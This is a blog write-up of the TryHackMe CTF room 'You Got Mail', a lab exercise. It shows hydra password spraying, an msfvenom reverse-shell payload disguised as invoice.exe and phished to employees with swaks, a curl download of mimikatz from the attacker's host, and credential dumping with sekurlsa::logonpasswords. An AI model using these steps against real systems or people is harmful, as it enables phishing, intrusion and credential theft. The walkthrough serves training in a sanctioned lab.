---
title: You Got Mail
date: 2025-04-04
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, lfi, path_traversal, web]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/yougotmail/banner.png
---

> You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on a certain IP and strictly passive reconnaissance on `brownbrick.co`. The scope includes only the domain and IP provided and does not include other TLDs.

## What is the user flag ?

As always, we first start the challenge with the classic nmap scan :

```shell
$ nmap -p- -T4 -A 10.10.212.63
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-13 17:21 CET
Nmap scan report for brownbrick.co (10.10.212.63)
Host is up (0.030s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 RIGHTS=texkA0001 IMAP4rev1 CHILDREN CAPABILITY completed IDLE OK NAMESPACE QUOTA ACL SORT
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2025-02-12T15:39:50
|_Not valid after:  2025-08-14T15:39:50
|_ssl-date: 2025-02-13T16:23:55+00:00; +1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-13T16:23:46+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-02-13T16:23:51
|_  start_date: N/A

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   42.31 ms 10.14.0.1
2   42.40 ms brownbrick.co (10.10.212.63)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.11 seconds
```

So that’s what we know so far for the target, also we can check the website ```https://brownbricks.co``` :

![1](/assets/img/tryhackme/ctf/yougotmail/1.png)

Is there any information that we can discover here ? The majority of the tabs are useless, but there are some names and email addresses on the *Our Team* tab.

![2](/assets/img/tryhackme/ctf/yougotmail/2.png)

Maybe those could be used to connect to the mail servers on the target machine.

We could test all of them one by one but we will use **hydra** and a wordlist containing the emails to help ourselves. 

After that, I used a few common words that could be used as a **weak password** for those users and managed to find it :

```shell
$ hydra -L usermails.txt -p 'bricks' smtp://target
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-24 18:23:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking smtp://target:25/
[25][smtp] host: target   login: lhedvig@brownbrick.co   password: bricks
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-24 18:23:57
```

We can use those credentials to try to connect to the open services :

```shell
telnet target 110
Trying 10.10.230.89...
Connected to target.
Escape character is '^]'.
+OK POP3
USER lhedvig@brownbrick.co
+OK Send your password
PASS bricks
+OK Mailbox locked and ready
LIST
+OK 0 messages (0 octets)
.
```

There is **no email** in the mailbox (as we can see with the POP3 test).

However, if we try to connect to the **SMTP** service, it works!

```shell
$ telnet target 25
Trying 10.10.230.89...
Connected to target.
Escape character is '^]'.
220 BRICK-MAIL ESMTP

EHLO test
250-BRICK-MAIL
250-SIZE 20480000
250-AUTH LOGIN
250 HELP

AUTH LOGIN
334 VXNlcm5hbWU6
lhedvig@brownbrick.co

334 UGFzc3dvcmQ6
bricks
535 Authentication failed. Restarting authentication process. #It doesn't work if we use clear credentials

AUTH LOGIN
334 VXNlcm5hbWU6
bGhlZHZpZ0Bicm93bmJyaWNrLmNv
334 UGFzc3dvcmQ6
YnJpY2tz
235 authenticated. #We should encode the credentials in base64 to authentify.
```

Using this email, we could use it to send phishing emails to all the other emails addresses we gathered. We can do that with the tool called **swak**.

First, we create a `.exe` reverse shell payload using **msfvenom**.

```shell
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.83.7 LPORT=4444 -f exe > invoice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

We start a listener on port `4444`.

```shell
$ nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

```shell
$ swaks --to oaurelius@brownbrick.co \
      --from lhedvig@brownbrick.co \
      --server 10.10.149.38 \
      --auth LOGIN \
      --auth-user lhedvig@brownbrick.co \
      --auth-password bricks \
      --header "Subject: Important Invoice - Please Review" \
      --attach invoice.exe
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying 10.10.149.38:25...
=== Connected to 10.10.149.38.
<-  220 BRICK-MAIL ESMTP
 -> EHLO exegol-thm
<-  250-BRICK-MAIL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> bGhlZHZpZ0Bicm93bmJyaWNrLmNv
<-  334 UGFzc3dvcmQ6
 -> YnJpY2tz
<-  235 authenticated.
 -> MAIL FROM:<lhedvig@brownbrick.co>
<-  250 OK
 -> RCPT TO:<oaurelius@brownbrick.co>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Mon, 24 Feb 2025 20:35:38 +0100
 -> To: oaurelius@brownbrick.co
 -> From: lhedvig@brownbrick.co
 -> Subject: Important Invoice - Please Review
 -> Message-Id: <20250224203538.008249@exegol-thm>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_8249"
 ->
 -> ------=_MIME_BOUNDARY_000_8249
 -> Content-Type: text/plain
 ->
 -> This is a test mailing
 -> ------=_MIME_BOUNDARY_000_8249
 -> Content-Type: application/octet-stream; name="invoice.exe"
 -> Content-Description: invoice.exe
 -> Content-Disposition: attachment; filename="invoice.exe"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> TVqQAAMAAAAE[...]AAAAAAAAAAAAAAAAAAA==
 ->
 -> ------=_MIME_BOUNDARY_000_8249--
 ->
 ->
 -> .
<-  250 Queued (0.141 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

We send the mail to all the possible users and after sending it to `tchikondi@brownbrick.co`, my netcat listener receives a connection from the reverse shell payload.

![3](/assets/img/tryhackme/ctf/yougotmail/3.png)

And we can find the **user’s flag** on his Desktop :

```shell
C:\Users\wrohit\Desktop>type flag.txt
type flag.txt
THM{[REDACTED]}
```

## What is the password of wrohit ?

As we connect to this account, we can check what kind of privileges we have and what groups our account belongs to :

```shell
C:\Users\wrohit\Documents>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

C:\Users\wrohit\Documents>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

We see that we have **administrators privileges** and **SeDebugPrivilege** which is important for what comes next. 

As an administrator on a Windows machine, we can try to dump some credentials that could be in the memory using **mimikatz**. 

So we transfer **mimikatz** from  the attacking machine to the target :

```shell
#On the attacking machine
$ python3 -m http.server 444

#On the target
curl http://IP:444/mimikatz.exe > mimikatz.exe
```

We launch it and put into **debug privileges** to access sensitive memory regions.

```shell
C:\Users\wrohit\Documents>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK
```

In order to dump plaintext passwords, NTLM hashes or Kerberos tickets of logged-in users, we use this command and manage to find the password of **wrohit** :

```shell
mimikatz # sekurlsa::logonpasswords

[...]

Authentication Id : 0 ; 1243886 (00000000:0012faee)
Session           : Batch from 0
User Name         : wrohit
Domain            : BRICK-MAIL
Logon Server      : BRICK-MAIL
Logon Time        : 3/29/2025 3:10:09 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1014
        msv :
         [00000003] Primary
         * Username : wrohit
         * Domain   : BRICK-MAIL
         * NTLM     : 8458995f1d0a4b0c107fb8e23362c814
         * SHA1     : ab5cc88336e18e54db987c44088757702d3a4c0f
        tspkg :
        wdigest :
         * Username : wrohit
         * Domain   : BRICK-MAIL
         * Password : [REDACTED]
        kerberos :
         * Username : wrohit
         * Domain   : BRICK-MAIL
         * Password : (null)
        ssp :
        credman :

[...]
```

## What is the password to access the hMailServer Administrator Dashboard ?

**hMailServer** stores the passwords in **MD5** in the `hMailServer.ini`, so we can open it and find the encrypted Administrator password :

```shell
C:\Users\wrohit\Documents>type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini"
type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini"
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=[REDACTED]
[Database]
Type=MSSQLCE
Username=
Password=47f104fa02185e821a83b2cfa56cf4ec
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

As we know that **MD5** is a weak encryption algorithm, we can try first to use a famous tool like **CrackStation** to first test it, and obtain the weak Administrator password :

![4](/assets/img/tryhackme/ctf/yougotmail/4.png)